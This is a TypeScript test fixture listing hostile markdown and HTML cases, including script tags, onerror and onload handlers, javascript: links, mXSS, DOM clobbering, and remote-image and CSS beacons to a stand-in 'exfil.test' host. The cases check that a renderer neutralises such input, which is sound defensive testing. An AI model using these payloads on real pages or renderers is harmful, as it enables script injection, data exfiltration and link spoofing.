// The hostile corpus, from the G4 bake-off: the webview security research's list plus G4's own. Each case
// renders in its own container, so a failure names the case. Payloads call window.__g4pwn(<case>) if they
// ever run. One home: these tests (hostile.test.tsx, in happy-dom) and the private real-browser harness
// (Chromium, WebKitGTK, WebView2, WKWebView) import this same file.
export type HostileCase = {
  id: string;
  markdown: string;
  /** Literal text that must show in the rendered text (raw HTML shows as text). */
  text?: string[];
  /** Exact number of real <img> elements the case renders. Default 0. */
  images?: number;
  /** A link-host hint the link component must show (link-text spoofing). */
  linkHost?: string;
};

const PNG_1PX =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";
const SVG_ONLOAD =
  "data:image/svg+xml;base64," +
  btoa(`<svg xmlns="http://www.w3.org/2000/svg" onload="parent.__g4pwn('data-svg')"/>`);
const DATA_HTML =
  "data:text/html;base64," + btoa("<script>parent.__g4pwn('data-html-link')</script>");
const LONG_LINE = "**clause** _term_ `code` [ref](https://a.example/x) ~~old~~ <b>x</b> "
  .repeat(300)
  .slice(0, 20_000);

export const CASES: HostileCase[] = [
  {
    id: "raw-script",
    markdown: `Before <script>window.__g4pwn("raw-script")</script> after.`,
    text: ["<script>"],
  },
  {
    id: "raw-script-block",
    markdown: `<script>\nwindow.__g4pwn("raw-script-block")\n</script>`,
    text: ["<script>"],
  },
  {
    id: "img-onerror",
    markdown: `<img src=x onerror="window.__g4pwn('img-onerror')">`,
    text: ["onerror"],
  },
  {
    id: "svg-onload",
    markdown: `<svg onload="window.__g4pwn('svg-onload')"><circle r="4"/></svg>`,
    text: ["<svg"],
  },
  {
    id: "iframe",
    markdown: `<iframe src="https://exfil.test/frame" srcdoc="<script>parent.__g4pwn('iframe')</script>"></iframe>`,
    text: ["<iframe"],
  },
  {
    id: "raw-anchor-js",
    markdown: `<a href="javascript:window.__g4pwn('raw-anchor-js')">click</a>`,
    text: ["<a href"],
  },
  { id: "js-link", markdown: `[click me](javascript:window.__g4pwn('js-link'))` },
  {
    id: "js-link-mixed-case",
    markdown: `[click](JaVaScRiPt:window.__g4pwn('js-link-mixed-case'))`,
  },
  { id: "js-link-entity", markdown: `[click](&#106;avascript:window.__g4pwn('js-link-entity'))` },
  { id: "js-autolink", markdown: `<javascript:window.__g4pwn('js-autolink')>` },
  { id: "vbscript-link", markdown: `[open](vbscript:msgbox("x"))` },
  { id: "data-html-link", markdown: `[document](${DATA_HTML})` },
  {
    id: "file-link",
    markdown: `[calc](file:///C:/Windows/System32/calc.exe) and [share](\\\\\\\\attacker\\\\share)`,
  },
  { id: "remote-image", markdown: `![secret](https://exfil.test/?q=secret)` },
  { id: "remote-image-http", markdown: `![pixel](http://exfil.test/pixel.gif "title")` },
  {
    id: "image-in-js-link",
    markdown: `[![badge](https://exfil.test/badge.png)](javascript:window.__g4pwn('image-in-js-link'))`,
  },
  { id: "data-svg-image", markdown: `![svg](${SVG_ONLOAD})` },
  {
    id: "allowed-images",
    markdown: `![dot](${PNG_1PX}) and ![exhibit](clauseo-file:matters/4471/exhibit.png)`,
    images: 2,
  },
  {
    id: "dom-clobber",
    markdown: `<a id="__g4clobber" name="__g4clobber">x</a> <form id="__g4clobber"><input name="attributes"></form>\n\nA claim[^__g4clobber].\n\n[^__g4clobber]: The note.`,
    text: ["<form"],
  },
  {
    id: "link-spoof",
    markdown: `[https://bank.example.com/login](https://evil.example.net/login)`,
    linkHost: "evil.example.net",
  },
  {
    id: "plain-links",
    markdown: `www.exfil.test/path, https://ok.example.com/ and <mailto:counsel@example.com>`,
  },
  {
    id: "mxss",
    markdown: `<math><mtext><table><mglyph><style><img src=x onerror="window.__g4pwn('mxss')">\n\n<noscript><p title="</noscript><img src=x onerror=window.__g4pwn('mxss-noscript')>">`,
    text: ["<math>", "<noscript>"],
  },
  {
    id: "style-injection",
    markdown: `<style>body{background:url(https://exfil.test/css)}</style>`,
    text: ["<style>"],
  },
  {
    id: "link-meta",
    markdown: `<link rel="dns-prefetch" href="https://exfil.test"><meta http-equiv="refresh" content="0;url=https://exfil.test">`,
    text: ["<link", "<meta"],
  },
  {
    id: "bidi",
    markdown: "Open invoice\u202Etxt.exe now; zero\u200Bwidth and \u2066isolate\u2069.",
  },
  {
    id: "code-with-html",
    markdown: "```html\n<script>window.__g4pwn('code-with-html')</script>\n```",
  },
  { id: "long-line", markdown: LONG_LINE, text: ["<b>"] },
  { id: "unterminated-fence", markdown: "```python\nimport os\nos.system('echo unterminated')\n" },
  // Added after G4, from PR #107's security review.
  {
    // micromark's browser entity decoder used innerHTML, which Trusted Types refuses (the root unmounted).
    id: "named-entities",
    markdown: "AT&amp;T and &copy; 2026; &nbsp;&mdash;&hellip; &lt;b&gt;not bold&lt;/b&gt;",
    text: ["AT&T", "© 2026", "—…", "<b>not bold</b>"],
  },
  // Nesting that overflowed the stack and unmounted the answer: capped at 32 levels, the rest as text.
  // Tail repair once stripped a half-arrived tag while streaming, hiding everything after it.
  {
    id: "half-tag-mid-stream",
    markdown: "Note: if a<b then the clause continues",
    text: ["a<b then the clause continues"],
  },
  {
    id: "open-tag-mid-stream",
    markdown: '<div class="a"\nmore text after it',
    text: ['<div class="a"', "more text after it"],
  },
  { id: "deep-list", markdown: "- ".repeat(1000) + "x", text: ["- - - x"] },
  { id: "deep-quote", markdown: "> ".repeat(3000) + "x", text: ["> > > x"] },
  // Deeper than the tree limit: the block shows its source as text. (5,000 a side overflowed the stack,
  // but micromark takes about 1.4 s to parse that, so streaming it here would take minutes.)
  { id: "deep-emphasis", markdown: "*".repeat(1000) + "a" + "*".repeat(1000), text: ["***a***"] },
];
